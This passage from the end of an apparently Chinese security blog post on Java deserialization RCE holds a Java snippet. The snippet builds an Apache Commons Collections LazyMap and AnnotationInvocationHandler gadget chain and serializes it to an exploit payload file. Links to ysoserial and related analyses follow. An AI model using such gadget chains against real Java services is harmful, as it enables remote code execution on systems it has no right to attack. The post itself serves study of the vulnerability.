+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transforms);</div><div class="line">Map tempMap = <span class="keyword">new</span> HashMap();</div><div class="line">Map lazyMap = LazyMap.decorate(tempMap, transformerChain);</div><div class="line"></div><div class="line">String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</div><div class="line"><span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</div><div class="line">constructor.setAccessible(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">InvocationHandler firstInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</div><div class="line">Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Test.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Map.class&#125;, firstInvocationHandler );</div><div class="line"></div><div class="line">InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);</div><div class="line"></div><div class="line">File f = <span class="keyword">new</span> File(<span class="string">"expLazyMap.payload"</span>);</div><div class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</div><div class="line">oos.writeObject(invocationHandlerToSerialize);</div><div class="line">oos.flush();</div><div class="line">oos.close();</div></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="http://www.angelwhu.com/blog/?p=394" target="_blank" rel="external">http://www.angelwhu.com/blog/?p=394</a></li>
+<li><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="external">Lib之过？Java反序列化漏洞通用利用分析</a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="external">Commons Collections Java反序列化漏洞深入分析</a></li>
+<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></li>
+<li><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet" target="_blank" rel="external">https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</a></li>
+<li><a href="http://wooyun.jozxing.cc/static/drops/papers-10467.html" target="_blank" rel="external">common-collections中Java反序列化漏洞导致的RCE原理分析</a></li>
+<li><a href="http://rickgray.me/2015/11/25/untrusted-deserialization-exploit-with-java.html" target="_blank" rel="external">从反序列化到命令执行 - Java 中的 POP 执行链</a></li>
+<li><a href="http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/" target="_blank" rel="external">http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/</a></li>
+<li><a href="http://techshow.ctrip.com/archives/1414.html" target="_blank" rel="external">http://techshow.ctrip.com/archives/1414.html</a></li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+          
+            <a href="/tags/JAVA/" rel="tag"># JAVA</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/05/05/Jenkins-未授权远程代码执行漏洞-CVE-2017-1000353/" rel="next" title="Jenkins 未授权远程代码执行漏洞(CVE-2017-1000353)">
+                <i class="fa fa-chevron-left"></i> Jenkins 未授权远程代码执行漏洞(CVE-2017-1000353)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/20/ysoserial反序列化研究/" rel="prev" title="ysoserial反序列化研究">
+                ysoserial反序列化研究 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars3.githubusercontent.com/u/15061633"
+               alt="Ethan" />
+          <p class="site-author-name" itemprop="name">Ethan</p>
+           
+              <p class="site-description motion-element" itemprop="description">personal blog :)</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友链
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JAVA反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">JAVA反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用Apache-Commons-Collections实现远程代码执行"><span class="nav-number">2.</span> <span class="nav-text">利用Apache Commons Collections实现远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用反射机制执行任意代码"><span class="nav-number">2.1.</span> <span class="nav-text">利用反射机制执行任意代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用transform-方法"><span class="nav-number">2.2.</span> <span class="nav-text">调用transform()方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap"><span class="nav-number">2.2.1.</span> <span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap"><span class="nav-number">2.2.2.</span> <span class="nav-text">LazyMap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#突破限制条件"><span class="nav-number">2.3.</span> <span class="nav-text">突破限制条件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TransformedMap-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">TransformedMap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LazyMap-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">LazyMap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ethan</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+  
+
+
+  
+
+</body>
+</html>
